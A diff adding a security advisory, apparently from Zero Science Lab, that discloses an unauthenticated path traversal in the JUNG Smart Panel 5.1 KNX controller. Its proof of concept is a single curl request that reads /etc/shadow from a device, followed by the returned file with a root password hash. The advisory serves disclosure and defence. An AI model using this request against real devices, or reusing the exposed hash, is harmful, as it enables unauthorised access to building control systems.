@@ -1,0 +1,54 @@
+
+JUNG Smart Panel 5.1 KNX Unauthenticated Absolute File Path Traversal
+
+
+Vendor: ALBRECHT JUNG GMBH & CO. KG
+Product web page: https://www.jung-group.com | https://www.jung.de
+Affected version: L1.12.22
+
+Summary: The JUNG Smart Panel 5.1 KNX is a flush-mounted 5-inch touch-sensitive
+controller designed for managing smart building automation via the KNX system.
+It serves as a, intuitive, centralized interface for controlling lighting, shading,
+heating, and security, utilizing a 640 x 480-pixel color TFT screen running on
+embedded Linux.
+
+Desc: The controller suffers from a directory traversal vulnerability. Exploiting
+this issue will allow an unauthenticated attacker to view arbitrary files within
+the context of the web server.
+
+Tested on: GNU/Linux 3.0.35-1.1.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5969
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2026-5969.php
+
+
+06.02.2026
+
+--
+
+
+$ curl http://17.17.17.17//etc/shadow
+root:lnC45zXXNWV9E:17011:0:99999:7:::
+daemon:*:16714:0:99999:7:::
+bin:*:16714:0:99999:7:::
+sys:*:16714:0:99999:7:::
+sync:*:16714:0:99999:7:::
+games:*:16714:0:99999:7:::
+man:*:16714:0:99999:7:::
+lp:*:16714:0:99999:7:::
+mail:*:16714:0:99999:7:::
+news:*:16714:0:99999:7:::
+uucp:*:16714:0:99999:7:::
+proxy:*:16714:0:99999:7:::
+www-data:*:16714:0:99999:7:::
+backup:*:16714:0:99999:7:::
+list:*:16714:0:99999:7:::
+irc:*:16714:0:99999:7:::
+gnats:*:16714:0:99999:7:::
+nobody:*:16714:0:99999:7:::
+messagebus:!:16714::::::
